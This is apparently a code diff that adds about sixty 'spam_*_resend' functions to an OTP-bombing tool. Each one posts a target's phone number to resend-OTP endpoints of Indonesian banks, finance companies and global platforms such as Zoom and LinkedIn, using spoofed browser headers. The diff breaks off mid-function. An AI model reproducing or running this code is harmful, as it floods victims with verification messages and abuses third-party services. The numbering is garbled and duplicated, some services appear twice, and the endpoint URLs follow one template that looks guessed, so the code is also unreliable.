@@ -3283,7 +3283,1631 @@ def spam_discord_resend(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None                        
+        return None      
+        
+# ============================================================
+# TAMBAHAN 50 LAYANAN OTP (RESEND / FORGOT PASSWORD)
+# ============================================================
+
+# 159. TIX ID - Resend OTP
+def spam_tixid_resend(phone_plus):
+    url = "https://api.tix.id/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.tix.id",
+        "Referer": "https://www.tix.id/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 160. M-Tix - Resend OTP
+def spam_mtix_resend(phone_plus):
+    url = "https://api.m-tix.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.m-tix.com",
+        "Referer": "https://www.m-tix.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 161. Pelago - Resend OTP
+def spam_pelago_resend(phone_plus):
+    url = "https://api.pelago.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.pelago.com",
+        "Referer": "https://www.pelago.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 162. Kkday - Resend OTP
+def spam_kkday_resend(phone_plus):
+    url = "https://api.kkday.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.kkday.com",
+        "Referer": "https://www.kkday.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 163. Sakuku - Resend OTP
+def spam_sakuku_resend(phone_plus):
+    url = "https://api.sakuku.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.sakuku.com",
+        "Referer": "https://www.sakuku.com/",
+    }
+    payload = {"phone": phone_plus, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 164. BNI Mobile - Resend OTP
+def spam_bni_mobile_resend(phone_08):
+    url = "https://api.bni.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bni.co.id",
+        "Referer": "https://www.bni.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 165. CIMB Niaga Mobile - Resend OTP
+def spam_cimb_resend(phone_08):
+    url = "https://api.cimbniaga.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.cimbniaga.co.id",
+        "Referer": "https://www.cimbniaga.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 166. Danamon Mobile - Resend OTP
+def spam_danamon_resend(phone_08):
+    url = "https://api.danamon.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.danamon.co.id",
+        "Referer": "https://www.danamon.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 167. Permata Mobile - Resend OTP
+def spam_permata_resend(phone_08):
+    url = "https://api.permatabank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.permatabank.co.id",
+        "Referer": "https://www.permatabank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 168. OCBC Mobile - Resend OTP
+def spam_ocbc_resend(phone_08):
+    url = "https://api.ocbc.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.ocbc.co.id",
+        "Referer": "https://www.ocbc.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 169. UOB Mobile - Resend OTP
+def spam_uob_resend(phone_08):
+    url = "https://api.uob.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.uob.co.id",
+        "Referer": "https://www.uob.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 170. HSBC Mobile - Resend OTP
+def spam_hsbc_resend(phone_08):
+    url = "https://api.hsbc.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.hsbc.co.id",
+        "Referer": "https://www.hsbc.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 171. Citibank Mobile - Resend OTP
+def spam_citibank_resend(phone_08):
+    url = "https://api.citibank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.citibank.co.id",
+        "Referer": "https://www.citibank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 172. Standard Chartered Mobile - Resend OTP
+def spam_scb_resend(phone_08):
+    url = "https://api.sc.com/id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.sc.com/id",
+        "Referer": "https://www.sc.com/id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 173. Maybank Mobile - Resend OTP
+def spam_maybank_resend(phone_08):
+    url = "https://api.maybank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.maybank.co.id",
+        "Referer": "https://www.maybank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 174. Mega Mobile - Resend OTP
+def spam_mega_resend(phone_08):
+    url = "https://api.bankmega.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankmega.com",
+        "Referer": "https://www.bankmega.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 175. Bukopin Mobile - Resend OTP
+def spam_bukopin_resend(phone_08):
+    url = "https://api.bukopin.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bukopin.co.id",
+        "Referer": "https://www.bukopin.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 176. Jago Mobile - Resend OTP
+def spam_jago_resend(phone_08):
+    url = "https://api.jago.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.jago.com",
+        "Referer": "https://www.jago.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 177. Aladin Mobile - Resend OTP
+def spam_aladin_resend(phone_08):
+    url = "https://api.aladinbank.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.aladinbank.com",
+        "Referer": "https://www.aladinbank.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 178. Seabank Mobile - Resend OTP
+def spam_seabank_resend(phone_08):
+    url = "https://api.seabank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.seabank.co.id",
+        "Referer": "https://www.seabank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 179. Superbank Mobile - Resend OTP
+def spam_superbank_resend(phone_08):
+    url = "https://api.superbank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.superbank.co.id",
+        "Referer": "https://www.superbank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 180. Neo Commerce Mobile - Resend OTP
+def spam_neocommerce_resend(phone_08):
+    url = "https://api.neocommerce.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.neocommerce.co.id",
+        "Referer": "https://www.neocommerce.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 181. Bank Raya Mobile - Resend OTP
+def spam_bankraya_resend(phone_08):
+    url = "https://api.bankraya.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankraya.co.id",
+        "Referer": "https://www.bankraya.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 182. Home Credit - Resend OTP
+def spam_homecredit_resend(phone_08):
+    url = "https://api.homecredit.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.homecredit.co.id",
+        "Referer": "https://www.homecredit.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 183. BFI Finance - Resend OTP
+def spam_bfi_resend(phone_08):
+    url = "https://api.bfi.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bfi.co.id",
+        "Referer": "https://www.bfi.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 184. FIF Group - Resend OTP
+def spam_fif_resend(phone_08):
+    url = "https://api.fifgroup.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.fifgroup.co.id",
+        "Referer": "https://www.fifgroup.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 185. Mandiri Tunas Finance - Resend OTP
+def spam_mtf_resend(phone_08):
+    url = "https://api.mtf.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.mtf.co.id",
+        "Referer": "https://www.mtf.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 186. OTO Group - Resend OTP
+def spam_oto_resend(phone_08):
+    url = "https://api.oto.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.oto.co.id",
+        "Referer": "https://www.oto.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 187. Suzuki Finance - Resend OTP
+def spam_suzuki_finance_resend(phone_08):
+    url = "https://api.suzukifinance.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.suzukifinance.co.id",
+        "Referer": "https://www.suzukifinance.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 188. Honda Finance - Resend OTP
+def spam_honda_finance_resend(phone_08):
+    url = "https://api.hondafinance.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.hondafinance.co.id",
+        "Referer": "https://www.hondafinance.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 189. Yamaha Finance - Resend OTP
+def spam_yamaha_finance_resend(phone_08):
+    url = "https://api.yamahafinance.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.yamahafinance.co.id",
+        "Referer": "https://www.yamahafinance.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 190. Astra Credit - Resend OTP
+def spam_astra_credit_resend(phone_08):
+    url = "https://api.astracredit.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.astracredit.co.id",
+        "Referer": "https://www.astracredit.co.id/",
+    }
+    payload = {"phone": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 191. Bank Mega - Resend OTP
+def spam_bankmega_resend(phone_08):
+    url = "https://api.bankmega.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankmega.com",
+        "Referer": "https://www.bankmega.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 192. Bank Permata - Resend OTP
+def spam_bankpermata_resend(phone_08):
+    url = "https://api.permatabank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.permatabank.co.id",
+        "Referer": "https://www.permatabank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 193. Bank Mayapada - Resend OTP
+def spam_mayapada_resend(phone_08):
+    url = "https://api.mayapada.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.mayapada.com",
+        "Referer": "https://www.mayapada.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 194. Bank Ina - Resend OTP
+def spam_bankina_resend(phone_08):
+    url = "https://api.bankina.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankina.com",
+        "Referer": "https://www.bankina.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 195. Bank Sinarmas - Resend OTP
+def spam_sinarmas_resend(phone_08):
+    url = "https://api.banksinarmas.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.banksinarmas.com",
+        "Referer": "https://www.banksinarmas.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 196. Bank Bukopin - Resend OTP
+def spam_bukopin_resend2(phone_08):
+    url = "https://api.bukopin.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bukopin.co.id",
+        "Referer": "https://www.bukopin.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 197. Bank Jago - Resend OTP
+def spam_bankjago_resend(phone_08):
+    url = "https://api.jago.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.jago.com",
+        "Referer": "https://www.jago.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 198. Bank Aladin - Resend OTP
+def spam_bankaladin_resend(phone_08):
+    url = "https://api.aladinbank.com/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.aladinbank.com",
+        "Referer": "https://www.aladinbank.com/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 199. Seabank - Resend OTP
+def spam_seabank_resend2(phone_08):
+    url = "https://api.seabank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.seabank.co.id",
+        "Referer": "https://www.seabank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 200. Superbank - Resend OTP
+def spam_superbank_resend2(phone_08):
+    url = "https://api.superbank.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.superbank.co.id",
+        "Referer": "https://www.superbank.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 201. Bank Neo Commerce - Resend OTP
+def spam_neocommerce_resend2(phone_08):
+    url = "https://api.neocommerce.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.neocommerce.co.id",
+        "Referer": "https://www.neocommerce.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 202. Bank Raya - Resend OTP
+def spam_bankraya_resend2(phone_08):
+    url = "https://api.bankraya.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankraya.co.id",
+        "Referer": "https://www.bankraya.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 203. Bank Capital - Resend OTP
+def spam_bankcapital_resend(phone_08):
+    url = "https://api.bankcapital.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankcapital.co.id",
+        "Referer": "https://www.bankcapital.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 204. Bank Maspion - Resend OTP
+def spam_bankmaspion_resend(phone_08):
+    url = "https://api.bankmaspion.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankmaspion.co.id",
+        "Referer": "https://www.bankmaspion.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 205. Bank Ganesha - Resend OTP
+def spam_bankganesha_resend(phone_08):
+    url = "https://api.bankganesha.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankganesha.co.id",
+        "Referer": "https://www.bankganesha.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 206. Bank Bumi Arta - Resend OTP
+def spam_bumiarta_resend(phone_08):
+    url = "https://api.bumiarta.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bumiarta.co.id",
+        "Referer": "https://www.bumiarta.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 207. Bank Ekonomi - Resend OTP
+def spam_bankekonomi_resend(phone_08):
+    url = "https://api.bankekonomi.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankekonomi.co.id",
+        "Referer": "https://www.bankekonomi.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 208. Bank Hana - Resend OTP
+def spam_bankhana_resend(phone_08):
+    url = "https://api.bankhana.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankhana.co.id",
+        "Referer": "https://www.bankhana.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 209. Bank ICBC - Resend OTP
+def spam_bankicbc_resend(phone_08):
+    url = "https://api.icbc.co.id/otp/resend"
+    headers = {
+        "User-Agent": get_ua_desktop(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.icbc.co.id",
+        "Referer": "https://www.icbc.co.id/",
+    }
+    payload = {"msisdn": phone_08, "type": "whatsapp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None      
+        
+# ============================================================
+# TAMBAHAN 50 LAYANAN OTP (259-308)
+# ============================================================
+
+# 209. Zoom
+def spam_zoom_resend(phone_plus):
+    url = "https://api.zoom.us/v2/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://zoom.us",
+        "Referer": "https://zoom.us/",
+    }
+    payload = {"phone": phone_plus, "country_code": "62"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 210. Shopify
+def spam_shopify_resend(phone_plus):
+    url = "https://api.shopify.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://shopify.com",
+        "Referer": "https://shopify.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 211. Wix
+def spam_wix_resend(phone_plus):
+    url = "https://api.wix.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://wix.com",
+        "Referer": "https://wix.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 212. WordPress.com
+def spam_wordpress_resend(phone_plus):
+    url = "https://api.wordpress.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://wordpress.com",
+        "Referer": "https://wordpress.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 213. Tumblr
+def spam_tumblr_resend(phone_plus):
+    url = "https://api.tumblr.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://tumblr.com",
+        "Referer": "https://tumblr.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 214. Flickr
+def spam_flickr_resend(phone_plus):
+    url = "https://api.flickr.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://flickr.com",
+        "Referer": "https://flickr.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 215. Imgur
+def spam_imgur_resend(phone_plus):
+    url = "https://api.imgur.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://imgur.com",
+        "Referer": "https://imgur.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 216. Pinterest
+def spam_pinterest_resend(phone_plus):
+    url = "https://api.pinterest.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://pinterest.com",
+        "Referer": "https://pinterest.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 217. Snapchat
+def spam_snapchat_resend(phone_plus):
+    url = "https://api.snapchat.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://snapchat.com",
+        "Referer": "https://snapchat.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 218. LinkedIn
+def spam_linkedin_resend(phone_plus):
+    url = "https://api.linkedin.com/v1/otp/resend"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://linkedin.com",
+        "Referer": "https://linkedin.com/",
+    }
+    payload = {"phone": phone_plus}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# 219. Tinder
+def spam_tinder_resend(phone_plus):
